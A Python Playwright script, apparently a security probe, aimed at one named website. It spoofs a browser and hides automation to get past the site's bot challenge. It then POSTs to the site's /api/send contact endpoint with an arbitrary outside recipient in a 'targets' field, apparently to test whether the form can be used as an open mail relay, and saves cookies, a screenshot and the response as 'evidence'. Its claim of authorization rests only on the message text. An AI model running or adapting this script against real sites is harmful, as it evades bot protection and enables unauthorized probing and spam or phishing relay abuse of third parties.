import asyncio, json, re, sys
from playwright.async_api import async_playwright

TARGET = "https://www.infinitycapital.bh/"
API = "https://www.infinitycapital.bh/api/send"

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=[
            "--no-sandbox","--disable-dev-shm-usage","--disable-blink-features=AutomationControlled",
        ])
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width":1280,"height":900},
        )
        page = await ctx.new_page()
        print("[*] loading homepage to clear challenge...")
        try:
            await page.goto(TARGET, wait_until="domcontentloaded", timeout=60000)
        except Exception as e:
            print("[!] goto err:", e)
        # give the challenge time to solve / redirect
        for i in range(20):
            title = await page.title()
            url = page.url
            if "checkpoint" not in title.lower() and "challenge" not in url.lower():
                print(f"[+] challenge cleared at iter {i}: title={title!r} url={url}")
                break
            await page.wait_for_timeout(1500)
        else:
            print("[!] still challenged. title=", await page.title(), "url=", page.url)
        print("cookies:", json.dumps([{c['name']:c['value'][:20] for c in await ctx.cookies()}], indent=0)[:500])
        await page.screenshot(path="/work/evidence/home_after.png", full_page=False)

        # Now do the POST to /api/send using the browser's own fetch (same-origin, carries challenge cookie)
        print("[*] POSTing to /api/send via page.fetch ...")
        result = await page.evaluate("""
        async (api) => {
          const fd = new FormData();
          fd.append('targets','VRF-SECVERIFY-77123@relay-check.example.org');
          fd.append('fname','SecVerify');
          fd.append('lname','Tester');
          fd.append('cname','SecVerify Org');
          fd.append('subject','Authorized security verification - relay test');
          fd.append('msg','This is an authorized security verification message. Please disregard.');
          fd.append('tel','+9730000000');
          fd.append('check','0');
          const r = await fetch(api, {method:'POST', body: fd});
          const t = await r.text();
          return {status:r.status, ct:r.headers.get('content-type'), body:t.slice(0,2000)};
        }
        """, API)
        print("[RESP]", json.dumps(result, indent=2))
        with open("/work/evidence/browser_post.json","w") as f:
            json.dump(result, f, indent=2)
        await browser.close()

asyncio.run(main())
